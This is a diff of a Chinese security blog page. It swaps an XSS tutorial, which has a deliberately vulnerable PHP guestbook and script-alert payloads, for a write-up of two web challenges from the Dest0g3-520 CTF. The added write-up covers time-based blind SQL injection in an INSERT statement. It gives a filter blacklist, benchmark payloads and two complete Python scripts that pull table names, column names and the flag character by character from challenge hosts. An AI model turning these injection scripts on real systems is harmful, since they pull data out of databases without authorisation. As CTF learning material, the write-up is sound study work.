@@ -12,7 +12,7 @@
 
 
 
-<title>XSS跨站脚本攻击 | Stuuupid&#39;s Blog</title>
+<title>2022Dest0g3-520迎新赛-web(部分) | Stuuupid&#39;s Blog</title>
 
 
 
@@ -477,7 +477,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">XSS跨站脚本攻击</h1>
+            <h1 class="post-title">2022Dest0g3-520迎新赛-web(部分)</h1>
             
                 <div class="post-meta">
                     
@@ -486,14 +486,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">December 24, 2022&nbsp;&nbsp;19:26:51</a>
+                        Date: <a href="#">December 27, 2022&nbsp;&nbsp;21:02:24</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="/categories/%E6%B8%97%E9%80%8F%EF%BC%9A%E4%BB%8E0%E5%88%B01/">渗透：从0到1</a>
+                                <a href="/categories/wp-CTF-web/">wp-CTF-web</a>
                             
                         </span>
                     
@@ -512,102 +512,41 @@
         </header>
 
         <div class="post-content">
-            <h1 id="XSS-基础"><a href="#XSS-基础" class="headerlink" title="XSS 基础"></a>XSS 基础</h1><h2 id="XSS-简介和原理"><a href="#XSS-简介和原理" class="headerlink" title="XSS 简介和原理"></a>XSS 简介和原理</h2><p>XSS（Cross Site Scripting 跨站脚本攻击），指恶意攻击者通过向网站插入恶意payload或恶意脚本，从而盗取cookie、session信息以利用用户身份进行违规操作、盗取用户资料等等。</p>
-<p>其原理是攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载<strong>被嵌入恶意代码的网页</strong>时，恶意脚本代码就会在<strong>用户的浏览器</strong>执行，造成跨站脚本攻击。</p>
-<h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>跨站脚本攻击可能会产生盗取（挟持）Cookie、网络钓鱼、植马挖矿、刷流量、劫持后台、篡改页面、内网扫描、制造蠕虫等。</p>
-<img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/harm.png" class="" title="XSS危害">
-
-<h2 id="常出现的场景"><a href="#常出现的场景" class="headerlink" title="常出现的场景"></a>常出现的场景</h2><ul>
-<li>重灾区：评论区、留言区、个人信息、订单信息等</li>
-<li>针对性区域：站内信、网页即时通讯、私信、意见反馈等</li>
-<li>存在风险：搜索框、当前目录、图片属性等</li>
-</ul>
-<h1 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>网站对于用户提交的数据没有进行过滤或转义操作（或者过滤、转义不足），导致攻击者嵌入的恶意代码被提交给服务端，服务端解析后，在相应内容中返回输入的XSS代码，最终由浏览器解释执行。</p>
-<ul>
-<li>反射型XSS 是<strong>非持久性、参数性</strong>的跨站脚本，恶意代码并<strong>没有保存</strong>在目标网站，而是通过引诱用户点击一个<strong>链接到目标网站的恶意链接</strong>来实施攻击。</li>
-<li>出现场景：多出现在搜索框或输入框</li>
-</ul>
-<p>原型如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;your input:&#x27; . $_GET[&#x27;input&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>若input为<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code><br>且input值未经任何过滤便直接输出，则服务端解析后，echo语句会将客户端输入的代码<strong>完整地输出到HTTP响应中，浏览器解析并执行</strong>，从而实现弹窗。<br>当然，攻击者可以直接以此构造url，当用户受惑点击该url链接，攻击就发生了。</p>
-<h3 id="反射型XSS-利用流程"><a href="#反射型XSS-利用流程" class="headerlink" title="反射型XSS 利用流程"></a>反射型XSS 利用流程</h3><img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/re.png" class="" title="反射型XSS利用原理">
-
-<h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p>反射型XSS每次皆需要用户提交代码（也即“点击”）才能进行攻击。而存储型XSS提交的XSS代码会<strong>存储在服务器端</strong>，下次请求该网页时无需再次提交XSS代码。常见的应用场景有留言板、在线聊天室、邮件服务或黑客的嵌入恶意JavaScript代码的博客文章等。</p>
-<p>当攻击者提交包含XSS代码的留言后，服务端会将其<strong>存储在数据库中</strong>，当其他用户访问网页查看留言时，服务端将从数据库中查询已有留言，并将其内容输出在HTTP响应中，由浏览器对包含恶意代码的响应解析并执行。</p>
-<p>原型如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">    $name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>攻击者提交留言<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>后，XSS代码被保存在 数据库中，并且立即执行了一次查询，XSS代码直接被触发。<br>当其他用户访问网页时，服务端都将从<strong>数据库</strong>中查询到该XSS代码，触发执行，从而被盗取cookie（sessionid）等信息。</p>
-<h3 id="存储型XSS-利用流程"><a href="#存储型XSS-利用流程" class="headerlink" title="存储型XSS 利用流程"></a>存储型XSS 利用流程</h3><img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/sd.png" class="" title="存储型XSS利用原理">
-
-<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><h3 id="DOM-简介"><a href="#DOM-简介" class="headerlink" title="DOM 简介"></a>DOM 简介</h3><ul>
-<li>DOM，全称Document Object Model(文档对象模型)，是W3C推荐的一种独立于平台和语言的标准，定义了<strong>访问HTML和XML文档的标准</strong>。</li>
-<li>Dom即Window对象下内置的document对象<img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/dom.png" class="" title="dom"></li>
-</ul>
-<p>document对象提供了非常多的操作方式，我们可以通过document对象实现对网页内容的一些操作如文本的修改、属性的修改、元素的获取等。</p>
-<p>与反射型 XSS不同，DOM XSS不需经由服务器的响应、处理</p>
-<img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/DOM1.png" class="" title="DOM原理">
-
-<ul>
-<li>DOM-XSS基于前端做的一些限制和筛选，对当前页面做一些直接化的修改。简单去理解就是输出点在DOM，属于特殊的反射型XSS。</li>
-</ul>
-<p><strong>常见的DOM方法</strong></p>
-<img src="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/dom2.png" class="" title="DOM方法">
-
-<h3 id="DOM-XSS-利用流程"><a href="#DOM-XSS-利用流程" class="headerlink" title="DOM-XSS 利用流程"></a>DOM-XSS 利用流程</h3><p>其利用与反射型XSS十分相似，不再赘述。但需要注意：由于前端的限制，我们需要在<strong>URL中输入XSS探测脚本</strong>。</p>
-<h2 id="三种类型的比较"><a href="#三种类型的比较" class="headerlink" title="三种类型的比较"></a>三种类型的比较</h2><table>
-<thead>
-<tr>
-<th align="center">XSS类型</th>
-<th align="center">存储型</th>
-<th align="center">反射型</th>
-<th align="center">DOM型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">触发过程</td>
-<td align="center">1、黑客构造XSS脚本<br>2、正常用户访问携带XSS脚本的页面</td>
-<td align="center">正常用户访问携带XSS脚本的URL</td>
-<td align="center">正常用户访问携带XSS脚本的URL</td>
-</tr>
-<tr>
-<td align="center">数据存储</td>
-<td align="center">服务器</td>
-<td align="center">URL</td>
-<td align="center">URL</td>
-</tr>
-<tr>
-<td align="center">谁来输出</td>
-<td align="center">后端Web应用程序</td>
-<td align="center">后端Web应用程序</td>
-<td align="center">前端JavaScript</td>
-</tr>
-<tr>
-<td align="center">输出位置</td>
-<td align="center">HTTP响应中</td>
-<td align="center">HTTP响应中</td>
-<td align="center">动态构造的DOM节点中</td>
-</tr>
-<tr>
-<td align="center">是否持久</td>
-<td align="center">是</td>
-<td align="center">否</td>
-<td align="center">否</td>
-</tr>
-</tbody></table>
-<h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><blockquote>
-<p>对用户的输入进行合理验证</p>
-</blockquote>
-<p>对 <code>(</code>, <code>&lt;</code> , <code>&gt;</code> , <code>&#39;</code> , <code>&quot;</code> 等特殊字符以及 <code>&lt;script&gt;</code>, <code>javascript</code> 等字符串进行过滤</p>
+            <p>最近身体抱恙，终于缓过劲来继续着手学习、做题。一方面对SQL注入基础和数据库基础做了一定的知识补充，另一方面接着投入到暑假时未竟的<strong>Dest0g3-520迎新赛</strong>上。感兴趣的朋友们可以到我的博客转转 <a href="https://ex1le23.github.io/">Stuuupid’s Blog</a> ，也欢迎大家为我提取一些宝贵的意见❤❤</p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/109/challenges">题目地址</a></p>
+<h1 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h1><p>网站title告诉我们这是一个“精美的钓鱼站”，大抵是用来诱惑用户输入账号密码，然后将他们存储到数据库中去。输入一些账号密码进去尝试一下，发现不会回显有用信息，差不多可以判断是一道insert型的盲注题了。<br>题目给出了Hint：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Really Easy SQL insert型注入</span><br><span class="line">$black_list=array(&#x27;union&#x27;,&#x27;updatexml&#x27;,&#x27;order&#x27;,&#x27;by&#x27;,&#x27;substr&#x27;,&#x27;and&#x27;,&#x27;extractvalue&#x27;,&#x27;;&#x27;,&#x27;sleep&#x27;,&#x27;join&#x27;,&#x27;alter&#x27;,&#x27;handler&#x27;,&#x27;char&#x27;,&#x27;+&#x27;,&#x27;/&#x27;,&#x27;like&#x27;,&#x27;regexp&#x27;,&#x27;offset&#x27;,&#x27;sleep&#x27;,&#x27;case&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,&#x27;hex&#x27;,&#x27;%0&#x27;,&#x27;load&#x27;,&#x27; &#x27;);</span><br></pre></td></tr></table></figure>
+<p>被ban掉了许多东西，包括时间盲注常用的函数<code>sleep</code>，没关系，我们还有<code>benchmark</code>可以用。</p>
 <blockquote>
-<p>根据数据位置设置恰当的输出编码</p>
+<p>这里给出一些<strong>时间盲注</strong>常用的函数：</p>
 </blockquote>
-<p>根据数据将要至于HTML上下文中的不同位置(HTML标准、HTML属性、<br>Javascript脚本、CSS、URL)，对所有不可信数据进行恰当的输出编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sleep()                      //延迟函数</span><br><span class="line">BENCHMARK(count,expr)函数    //将expr语句执行count次来达到延迟的目的，返回值为0</span><br><span class="line">if(condition,true,false)     //条件语句</span><br><span class="line">If表达式：IF(expr1,expr2,expr3)</span><br><span class="line">/* 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3 */</span><br><span class="line">ascii()                     //转换成ascii码</span><br><span class="line">substring(&quot;string&quot;,strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符</span><br><span class="line">Mid函数：MID(column_name,start[,length])</span><br></pre></td></tr></table></figure>
+
+<p>用<code>benchmark</code>方法测试一下（空格被ban了，所以用<code>%a0</code>过滤。前后的<code>&#39;</code>是为了闭合，除此外，还可以采用<code>(</code>等方式）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;or%a0benchmark(1000000,sha(1))or&#x27;</span><br></pre></td></tr></table></figure>
+<img src="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/benchmark.png" class="" title="benchmark测试">
+
+<p>测试延时在4s左右。</p>
 <blockquote>
-<p>设置HttpOnly属性</p>
+<p>关于insert注入的原理，我这里留一个疑问。对于这道题目而言，username显然是一个字符串型，而benchmark函数返回值为0，如果insert语句如下</p>
 </blockquote>
-<p>避免攻击者利用XSS属性进行Cookie劫持攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test values(&#x27;a&#x27;or%a0benchmark(1000000,sha(1))or&#x27;&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>那么SQL为什么不会因为错误<code>Truncated incorrect DOUBLE value: &#39;a&#39;</code>而无效？下图是我在本地MySQL进行测试的结果。可以看到，当没有<code>a</code>时会成功执行<code>benchmark</code>函数，并把返回的<code>0</code>作为字符型存入数据库表。而有<code>a</code>时，则会报错。（在后面的尝试中，发现把<code>a</code>改成其他数字也是可以成功执行的）</p>
+</blockquote>
+<img src="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/test.png" class="" title="测试">
+
+<p>接下来回顾一些常用的SQL SELECT操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 爆表名</span><br><span class="line">select(group_concat(table_name))from(information_schema.tables)where(table_schema=database());</span><br><span class="line">// 爆字段名（列名）</span><br><span class="line">select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;test&#x27;);  // 这里的&#x27;test&#x27;即上一步爆出的表名</span><br></pre></td></tr></table></figure>
+
+<p>前面我们测试的延时在4s左右，延迟过长，这里选择更用<code>md5(1)</code>，将延时控制在2s左右。<code>mid</code>函数能够获取爆出的数据的每一个字符，于是我们可以二分查找所有的字符进行遍历(这里用ASCII码为从32到127的字符集来实现)，与之ASCII码值进行比对——当<code>i &lt; mid</code>时，说明<code>mid</code>找大了，更新为最大值为<code>mid</code>；反之，则更新最小值为<code>mid</code>。<code>mid</code>更新的实现只需要每次进行<code>request</code>连接，并设置超时时间。当超时时，说明<code>i &lt; mid</code>，触发了<code>benchmark</code>.</p>
+<p>根据上面的分析，我们就可以利用SQL语句能够在insert语句中被执行的特点，构造POC. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://20351089-cacb-4fea-a68f-feb330422825.node4.buuoj.cn:81/&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    m = 32</span><br><span class="line">    n = 127</span><br><span class="line">    while 1:</span><br><span class="line">        mid = (m + n) // 2</span><br><span class="line"></span><br><span class="line">        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #flaggg,user</span><br><span class="line">        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #cmd</span><br><span class="line">        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: payload,</span><br><span class="line">            &#x27;password&#x27;: &#x27;123456&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        # print(data)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url=url, data=data, timeout=1.5)</span><br><span class="line">            m = mid</span><br><span class="line">        except:</span><br><span class="line">            n = mid</span><br><span class="line">        if (m + 1 == n):</span><br><span class="line">            flag += chr(m)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure>
+
+<p>如上就是一道盲注题的完整思路，或可作为学习SQL注入的基础知识的一部分来看。关于最大超时时间的设置和<code>benchmark</code>的执行次数需要根据实际测试情况进行调整，与网速有着关系，这可能导致跑出来的结果有误差，有没有减小误差的办法呢？</p>
+<h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>与上题几乎没有什么不同，区别在于多过滤了<code>&lt;</code>和<code>&gt;</code>（虽然我也不知道怎么看出来多过滤了这俩玩意儿，Hint貌似没给），因此无法再用二分法，改用<code>=</code>即可。<br>构造POC如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://983f9517-713d-4041-8c6d-d3dc94e57452.node4.buuoj.cn:81/&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    a = 0</span><br><span class="line">    for j in range(128, 32, -1):</span><br><span class="line">        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #flaggg,user</span><br><span class="line">        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #cmd</span><br><span class="line">        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: &#x27;a&#x27;,</span><br><span class="line">            &#x27;password&#x27;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        # print(data)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url=url, data=data, timeout=1.5)</span><br><span class="line">        except:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        if (j == 33):</span><br><span class="line">            a = 1</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">    if (a == 1):</span><br><span class="line">        print(flag)</span><br><span class="line">        break</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure>
+<img src="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/flag.png" class="" title="flag">
 
         </div>
 
@@ -626,11 +565,9 @@
                 <span class="tag">
                     
                     
+                        <a href="/tags/CTF/"># CTF</a>
+                    
                         <a href="/tags/web/"># web</a>
-                    
-                        <a href="/tags/%E6%B8%97%E9%80%8F/"># 渗透</a>
-                    
-                        <a href="/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"># 常见漏洞</a>
                     
                         
                 </span>
@@ -649,10 +586,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/">2022Dest0g3-520迎新赛-web(部分)</a>
             
-            
-            <a class="next" rel="next" href="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+            <a class="next" rel="next" href="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS跨站脚本攻击</a>
             
         </section>
 
